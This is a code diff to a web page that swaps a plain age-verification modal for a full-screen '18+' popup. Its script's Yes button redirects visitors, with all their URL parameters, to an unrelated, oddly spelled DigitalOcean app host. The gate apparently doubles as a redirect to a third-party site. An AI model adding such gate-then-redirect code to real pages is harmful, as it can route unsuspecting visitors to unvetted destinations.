@@ -7,18 +7,6 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Age Verification Modal -->
-<div id="ageModal" class="age-modal">
-  <div class="age-box">
-    <h2>Are you 18+?</h2>
-    <p>You must be 18 years or older to enter this website.</p>
-    <div class="age-buttons">
-      <button id="ageYes">Yes</button>
-      <button id="ageNo">No</button>
-    </div>
-  </div>
-</div>
-
     <!-- Header -->
     <header id="header">
         <div class="header-container">
@@ -350,5 +338,66 @@
     </footer>
 
     <script src="script.js"></script>
+    <!-- AGE VERIFICATION POPUP -->
+<div id="agePopup" style="
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  backdrop-filter:blur(8px);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:999999;
+">
+
+  <div style="
+    background:#fff;
+    padding:30px;
+    border-radius:12px;
+    text-align:center;
+    width:90%;
+    max-width:350px;
+    box-shadow:0 20px 40px rgba(0,0,0,0.4);
+  ">
+    <h2>Are you 18+?</h2>
+    <p style="font-size:14px;color:#555;">
+      You must be 18 years or older to enter this website.
+    </p>
+
+    <div style="margin-top:20px;display:flex;gap:15px;">
+      <button
+        style="flex:1;padding:12px;font-size:16px;border-radius:8px;background:#16a34a;color:#fff;border:none;cursor:pointer;"
+        onclick="goYes()"
+      >
+        Yes
+      </button>
+
+      <button
+        style="flex:1;padding:12px;font-size:16px;border-radius:8px;background:#dc2626;color:#fff;border:none;cursor:pointer;"
+        onclick="goNo()"
+      >
+        No
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ✅ YOUR URLs
+  const YES_URL = "https://play-solitiare-2-f7dqg.ondigitalocean.app";
+  const NO_URL  = "https://www.google.com";
+
+  // Pass all URL params (UTMs, refs, etc.)
+  const params = window.location.search || "";
+
+  function goYes() {
+    window.location.href = YES_URL + params;
+  }
+
+  function goNo() {
+    window.location.href = NO_URL + params;
+  }
+</script>
+
 </body>
 </html>
